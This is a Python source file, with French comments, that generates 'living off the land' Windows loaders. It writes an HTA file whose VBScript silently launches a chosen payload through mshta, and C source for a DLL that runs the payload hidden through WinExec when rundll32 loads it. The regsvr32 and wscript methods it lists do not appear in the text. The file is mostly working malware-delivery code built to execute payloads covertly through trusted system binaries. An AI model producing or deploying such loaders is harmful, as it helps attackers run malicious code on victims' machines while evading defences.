# lolbas_loader.py - Loaders LOLBAS (mshta, rundll32, regsvr32)
import os
import random

class LOLBASLoader:
    def __init__(self):
        self.techniques = {
            'mshta': self._generate_mshta_loader,
            'rundll32': self._generate_rundll32_loader,
            'regsvr32': self._generate_regsvr32_loader,
            'wscript': self._generate_wscript_loader
        }
    
    def generate_loader(self, technique, payload_path, output_dir):
        """Génère un loader LOLBAS"""
        if technique not in self.techniques:
            raise ValueError(f"Technique {technique} non supportée")
        
        return self.techniques[technique](payload_path, output_dir)
    
    def _generate_mshta_loader(self, payload_path, output_dir):
        """Génère un loader mshta.exe"""
        hta_content = f'''
<html>
<head>
<script language="VBScript">
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{payload_path}", 0, False
window.close()
</script>
</head>
<body></body>
</html>
'''
        hta_path = os.path.join(output_dir, "loader.hta")
        with open(hta_path, 'w') as f:
            f.write(hta_content)
        return hta_path
    
    def _generate_rundll32_loader(self, payload_path, output_dir):
        """Génère un loader rundll32.exe"""
        dll_code = f'''
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        WinExec("{payload_path}", SW_HIDE);
    }}
    return TRUE;
}}

extern "C" __declspec(dllexport) void RunPayload() {{
    WinExec("{payload_path}", SW_HIDE);
}}
'''
        dll_path = os.path.join(output_dir, "loader.dll")
        with open(dll_path, 'w') as f:
            f.write(dll_code)
        return dll_path